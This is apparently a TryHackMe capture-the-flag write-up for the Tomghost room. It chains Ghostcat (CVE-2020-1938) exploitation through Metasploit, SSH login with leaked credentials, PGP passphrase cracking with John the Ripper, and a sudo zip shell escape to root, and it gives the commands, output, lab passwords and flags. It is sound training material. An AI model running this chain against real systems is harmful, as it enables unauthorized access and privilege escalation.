# Tomghost-writeup-TryHackMe

# 👻 TryHackMe: Tomghost Write-Up

## Overview

| Category | Details |
|-----------|----------|
| Room | Tomghost |
| Platform | TryHackMe |
| Difficulty | Easy / Medium |
| Target IP | `<target_ip>` |
| Operating System | Linux |
| Main Concepts | Ghostcat (CVE-2020-1938), SSH Access, PGP Key Cracking, User Pivoting, Sudo Privilege Escalation |

---

# Executive Summary

This room demonstrates how a seemingly minor service exposure can lead to a complete system compromise.

The attack begins with discovering an exposed Apache Tomcat server and an open AJP (Apache JServ Protocol) service. By exploiting the Ghostcat vulnerability (CVE-2020-1938), internal application files become accessible, revealing valid SSH credentials.

After obtaining an initial shell, cryptographic artifacts are discovered. Cracking a protected PGP private key allows access to encrypted credentials belonging to another user. Finally, a dangerous sudo configuration grants passwordless execution of the `zip` binary as root, leading to full privilege escalation.

---

# Attack Path

```text
[Reconnaissance]
        │
        ▼
Nmap discovers Tomcat 9.0.30 and AJP Port 8009
        │
        ▼
Ghostcat (CVE-2020-1938) Exploitation
        │
        ▼
Read internal web.xml configuration file
        │
        ▼
Extract SSH credentials for user skyfuck
        │
        ▼
SSH Login
        │
        ▼
Discover PGP Key + Encrypted Credentials
        │
        ▼
Crack PGP Passphrase using John the Ripper
        │
        ▼
Decrypt credential.pgp
        │
        ▼
Obtain credentials for merlin
        │
        ▼
User Pivot to merlin
        │
        ▼
Enumerate sudo privileges
        │
        ▼
Exploit zip via GTFOBins
        │
        ▼
Root Shell
```

---

# Phase 1: Reconnaissance

The first stage of any penetration test is identifying what services are exposed on the target system.

We begin with an aggressive Nmap scan.


## Nmap Scan

```bash
nmap -sC -sV -A <target_ip>
```

### Explanation

| Flag | Purpose |
|--------|---------|
| `-sC` | Runs default NSE scripts |
| `-sV` | Detects service versions |
| `-A` | Enables OS detection, version detection, script scanning, and traceroute |

### Results

```text
PORT     STATE SERVICE VERSION

22/tcp   open  ssh
53/tcp   open  tcpwrapped
8009/tcp open  ajp13
8080/tcp open  http    Apache Tomcat 9.0.30
```

### Important Findings

| Port | Service | Significance |
|--------|---------|-------------|
| 22 | SSH | Remote login service |
| 8009 | AJP13 | Internal Tomcat communication protocol |
| 8080 | Apache Tomcat | Web application server |

The most interesting finding here is the combination of:

- Apache Tomcat 9.0.30
- Open AJP Port (8009)

This combination immediately suggests possible Ghostcat exploitation.

---

# Phase 2: Web Enumeration

Before exploiting anything, we should understand what is hosted on the web server.

Directory enumeration helps discover hidden endpoints, admin panels, backups, documentation, and application files.

---

## Feroxbuster Scan

```bash
feroxbuster -u http://10.49.168.39:8080/ -w /usr/share/wordlists/dirb/common.txt -x php,txt -o feroxbuster.txt
```



---

### Discovered Directories

```text
/docs/
/examples/
/manager/html
/RELEASE-NOTES.txt
```


# Phase 3: Vulnerability Identification

## How Was Ghostcat Identified?

During enumeration, Nmap and the web interface revealed:

```text
Apache Tomcat 9.0.30
```
<img width="1002" height="913" alt="tomcat" src="https://github.com/user-attachments/assets/c3438d9c-7b55-402c-bb17-3a4bd01e6e1a" />

The next logical step is vulnerability research.

A quick search for:

```text
Apache Tomcat 9.0.30 vulnerabilities
```

reveals:

```text
CVE-2020-1938
Ghostcat
```

---

## What is Ghostcat?

Ghostcat is a file-read and file-inclusion vulnerability affecting vulnerable Apache Tomcat versions.



The vulnerability abuses the AJP protocol.

Since:

```text
Port 8009 (AJP) is exposed
```

and

```text
Tomcat version = 9.0.30
```

the machine satisfies the exploitation requirements.

---




# Phase 4: Ghostcat Exploitation

Launch Metasploit:

```bash
msfconsole
```

Select the Ghostcat module:

```text
search ghostcat
use auxiliary/admin/http/tomcat_ghostcat
```

Configure the target:

```text
set RHOSTS <target_ip>
run
```

---

## Result

The module successfully reads:

```text
/WEB-INF/web.xml
```

This file is normally inaccessible from outside the server.

---

### Extracted Credentials

```xml
<description>
    Welcome to GhostCat
    skyfuck:8730281lkjlkjdqlksalks
</description>
```
<img width="1270" height="847" alt="skyfunk" src="https://github.com/user-attachments/assets/ed5e0a8b-34ec-4157-a6b5-d846f010c2ae" />

---

## Why Is This Important?

Configuration files frequently contain:

- Hardcoded credentials
- Database passwords
- API keys
- Internal application settings

In this case, the file revealed valid SSH credentials.

---

# Phase 5: Initial Access

Using the discovered credentials:

```bash
ssh skyfuck@<target_ip>
```

Password:

```text
8730281lkjlkjdqlksalks
```

---

## Successful Login

We now have a shell as:
<img width="724" height="633" alt="ssh_skyfunk" src="https://github.com/user-attachments/assets/34a279c7-4812-4040-89a2-28042eceb4d9" />


```text
skyfuck@ubuntu
```

---

# Phase 6: Local Enumeration

Whenever initial access is obtained, the next step is local enumeration.

We inspect the user's home directory.

```bash
ls -la
```

### Interesting Files

```text
tryhackme.asc
credential.pgp
```

---

## What Are These Files?

### tryhackme.asc

A PGP private key.

Used to decrypt encrypted information.

---

### credential.pgp

An encrypted file.

Cannot be viewed without the correct private key and passphrase.

---

# Phase 7: PGP Passphrase Cracking

Even though we possess the private key, it is password-protected.

Therefore we must crack its passphrase.

---

## Transfer the Key

Copy the key to the attacking machine.

---

## Convert to John Format

John the Ripper cannot crack the key directly.

First convert it into a crackable hash format.

```bash
gpg2john tryhackme.asc > hash.txt
```

### Why?

This extracts the password hash from the key and converts it into a format John understands.

---

## Crack the Passphrase

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```


---

## Result

```text
alexandru
```
<img width="809" height="402" alt="alexandru" src="https://github.com/user-attachments/assets/b83e7981-056a-4c84-904f-ac6b4832e21f" />

The private key passphrase has been recovered.

---

# Phase 8: Decrypting the Secret

## Understanding What Happens

Think of:

```text
tryhackme.asc
```

as a locked key box.

And:

```text
credential.pgp
```

as a locked treasure chest.

The passphrase unlocks the key box, giving access to the key needed to open the treasure chest.

---

## Import the Key

```bash
gpg --import tryhackme.asc
```

---

## Decrypt the File

```bash
gpg --decrypt credential.pgp
```

---

## Output
<img width="1029" height="520" alt="merlinpassword" src="https://github.com/user-attachments/assets/e8dae41a-8254-409c-ab4d-a409d3b8b584" />


```text
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

A new set of credentials is revealed.

---

# Phase 9: User Pivoting

Switch to the new user.

```bash
su merlin
```

Enter the recovered password.

---

## Verify Access

```bash
whoami
```

Output:

```text
merlin
```

---

## Capture User Flag

```bash
cat user.txt
```

```text
THM{GhostCat_1s_so_cr4sy}
```

---

# Phase 10: Privilege Escalation Enumeration

Now that we have access as `merlin`, we need to identify ways to elevate privileges.

The first command to check is:

```bash
sudo -l
```

---

## Why Use sudo -l?

This displays which commands the current user can execute with elevated privileges.

Misconfigured sudo permissions are one of the most common privilege escalation vectors.

---

## Output
<img width="1096" height="179" alt="sudo-l" src="https://github.com/user-attachments/assets/72a50534-d5ff-403e-8040-db491cfa61b4" />


```text
User merlin may run the following commands on ubuntu:

(root : root) NOPASSWD: /usr/bin/zip
```

---

# Phase 11: Analyzing the Misconfiguration

This means:

- User `merlin` can execute `zip`
- As root
- Without entering a password

At first glance, this may seem harmless.

However, many legitimate binaries can be abused.

---

## GTFOBins

GTFOBins is a collection of legitimate Linux binaries that can be abused for privilege escalation.

Searching for:

```text
zip GTFOBins
```

reveals a shell escape technique.

---

## Why Does This Work?

The `zip` utility contains:

```text
-T
```

Integrity testing functionality.

It also supports:

```text
-TT
```

which specifies a custom test command.

If `zip` is executed as root, the custom command is also executed as root.

---

# Phase 12: Root Exploitation

Execute:

```bash
sudo zip /tmp/test /etc/hosts -T -TT '/bin/sh #'
```

---


---

## Result

```bash
# whoami
root
```

Root shell obtained.

---

## Capture Root Flag

```bash
cd /root
cat root.txt
```

Output:

```text
THM{Z1P_1S_FAKE}
```

---


# Conclusion

Tomghost is an excellent room for learning how multiple small weaknesses can combine into a complete compromise. The attack chain demonstrates real-world penetration testing methodology:

1. Reconnaissance and service enumeration
2. Vulnerability research
3. Exploitation of exposed services
4. Credential harvesting
5. Cryptographic key cracking
6. User pivoting
7. Privilege escalation through sudo misconfigurations

The room reinforces the importance of proper service exposure, secure credential management, strong cryptographic practices, and strict privilege controls.
